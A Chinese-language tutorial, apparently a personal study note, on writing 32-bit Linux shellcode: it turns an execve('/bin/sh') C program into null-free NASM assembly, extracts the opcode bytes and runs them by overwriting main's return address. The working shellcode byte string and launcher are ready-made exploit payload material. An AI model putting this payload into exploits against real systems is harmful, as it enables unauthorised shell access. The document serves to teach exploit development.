# Shellcode  

----------------------------------

### 0x00 前言  
介绍 shellcode 的编写。  
Shellcode实际是一段代码（也可以是填充数据），是用来发送到服务器利用特定漏洞的代码，一般可以获取权限。另外，Shellcode一般是作为数据发送给受攻击服务器的。


### 0x01 shellcode的作用 
shellcode是一段代码，是一段机器可以执行的二进制(opcode)，当我们通过二进制漏洞挖掘，找到一个可以利用的漏洞后，就需要我们编写shellcode，来执行一些功能或者是提权操作。


### 0x02 一段 C 的利用程序  
我们想通过一段代码来获取一个shell，写一段 C 的利用程序：
	
	#include <stdio.h>

	int main() {
		char* happy[2];
		happy[0] = "/bin/sh";
		happy[1] = NULL;

		execve(happy[0], happy, NULL);
	
		return 0;
	}
	
这段代码可以获得一个 `sh` 的shell：

	[root@CentOS7x86 test]# gcc 2.c -o xx
	[root@CentOS7x86 test]# ./xx 
	sh-4.2# 
	
通过 GDB 反汇编代码，分析一下程序的流程，便于我们写汇编代码以提取shellcode：

	[root@CentOS7x86 test]# gdb xx 
	gdb-peda$ disas main
	Dump of assembler code for function main:
	   0x08048420 <+0>:		push   ebp
	   0x08048421 <+1>:		mov    ebp,esp
	   0x08048423 <+3>:		and    esp,0xfffffff0
	   0x08048426 <+6>:		sub    esp,0x20
	   0x08048429 <+9>:		mov    DWORD PTR [esp+0x18],0x80484f4
	   0x08048431 <+17>:	mov    DWORD PTR [esp+0x1c],0x0
	   0x08048439 <+25>:	mov    eax,DWORD PTR [esp+0x18]
	   0x0804843d <+29>:	mov    DWORD PTR [esp+0x8],0x0
	   0x08048445 <+37>:	lea    edx,[esp+0x18]
	   0x08048449 <+41>:	mov    DWORD PTR [esp+0x4],edx
	   0x0804844d <+45>:	mov    DWORD PTR [esp],eax
	   0x08048450 <+48>:	call   0x8048310 <execve@plt>
	   0x08048455 <+53>:	mov    eax,0x0
	   0x0804845a <+58>:	leave  
	   0x0804845b <+59>:	ret    
	End of assembler dump.

通过分析后，是将 `/bin/sh` 压入栈，然后放入到该字符串地址放入到 ebx 中，将命令行参数放入到 ecx 中，将环境变量指针放入 edx 中，将 11 放入 eax 中，然后通过 `int 80` 调用软中断，调用系统调用 `execve`


### 0x03 提取shellcode
分析完上面的反汇编代码后，我们就可以通过编写汇编代码，或者是 C 的内联汇编来编写利用程序提取 shellcode。（这里用x86汇编，nasm编译）

	section .text
	global _start

	_start:				;_start
	xor eax, eax
	push eax			;push \x00
	push 0x68732f2f		;push //sh
	push 0x6e69622f		;push /bin
	mov ebx, esp		;ebx = esp	address of "/bin//sh"
	push eax			;push \x00
	push ebx			;push address of "/bin//sh"
	mov ecx, esp		;ecx = esp	address of array
	xor edx, edx		;edx = 0
	mov al, 0xb			;al = 11	execve system call
	int 0x80			;soft irq

	;ebx: 可执行文件路径的指针
	;ecx: 命令行参数的指针
	;edx: 环境变量的指针

	;nasm -f elf 3.asm
	;ld -o xx 3.o

在编写 shellcode 的时候要避免一些不可用字符，比如 `\0` 字符出现在shellcode中，当漏洞程序使用字符串处理函数进行处理时，就会造成截断情况。所以上面部分在为 `/bin/sh` 加入 `\0` 字符时，是先将 `xor eax, eax`，再将 eax 压入栈中截断字符串。  
（PS：这里 `/bin/sh` 改为 `/bin//sh` 压入栈，也是避免不可用字符； `/bin//sh` 的效果和 `/bin/sh` 一样）

执行效果：  
	
	[root@CentOS7x86 test]# nasm -f elf 3.asm
	[root@CentOS7x86 test]# ld -o xx 3.o
	[root@CentOS7x86 test]# ./xx 
	sh-4.2# 

现在开始提取shellcode，linux下使用 `objdump -d` 可以得到程序的反汇编代码和对应的 opcode：

	[root@CentOS7x86 test]# objdump -d xx 

	xx：     文件格式 elf32-i386


	Disassembly of section .text:

	08048060 <_start>:
	 8048060:	31 c0                	xor    %eax,%eax
	 8048062:	50                   	push   %eax
	 8048063:	68 2f 2f 73 68       	push   $0x68732f2f
	 8048068:	68 2f 62 69 6e       	push   $0x6e69622f
	 804806d:	89 e3                	mov    %esp,%ebx
	 804806f:	50                   	push   %eax
	 8048070:	53                   	push   %ebx
	 8048071:	89 e1                	mov    %esp,%ecx
	 8048073:	31 d2                	xor    %edx,%edx
	 8048075:	b0 0b                	mov    $0xb,%al
	 8048077:	cd 80                	int    $0x80


### 0x04 执行 
上一步中得到了 opcode，可以利用了：

	char shellcode[] = 
		"\x31\xc0"
		"\x50" 
		"\x68\x2f\x2f\x73\x68"
		"\x68\x2f\x62\x69\x6e"
		"\x89\xe3"
		"\x50"
		"\x53"
		"\x89\xe1" 
		"\x31\xd2"
		"\xb0\x0b"
		"\xcd\x80";

	int main() {
		int *ret;

		ret = &ret + 2;
		*ret = shellcode;

		return 0;
	}

执行效果：  
（这里编译的时候加上 `-z execstack` 让栈上可执行，我们的shellcode的起始位置是`main`的返回地址的位置，位于栈上）

	# gcc 4.c -z execstack -o xx 
	# ./xx 
	sh-4.2# 

ok.


</br>

-----------------------------------  
References:  
《The shellcoder's handbook》

Author: xx  
Time: 2017.4.19